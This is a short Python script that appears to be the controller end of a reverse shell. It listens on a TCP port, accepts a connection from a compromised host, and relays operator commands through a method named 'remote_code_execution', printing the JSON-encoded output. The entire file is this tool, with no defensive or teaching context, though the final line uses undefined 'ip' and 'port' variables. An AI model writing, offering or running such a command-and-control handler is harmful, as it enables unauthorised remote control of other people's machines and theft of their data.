import socket
import json

class Connections_Listener:
  def __init__(self, ip, port):
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind((ip, port))
    listener.listen(0)
    print("[+] Waiting for a connection")
    self.connection, address = listener.accept()
    print("[+] Got a connection")
  
  def send_data(self, data):
    json_data = json.dumps(data)
    self.connection.send(json_data.encode('utf-8'))
  
  def receive_data(self):
    json_data = ""
    while True:
      try:
        json_data += self.connection.recv(1024).decode('utf-8')
        return json.loads(json_data)
      except ValueError:
        continue
  
  def remote_code_execution(self, command):
    self.send_data(command)
    return self.receive_data()
  
  def start(self):
    while True:
      input_command = input(">>> ")
      result = self.remote_code_execution(input_command)
      print(result)

listen = Connections_Listener(ip, port)
listen.start()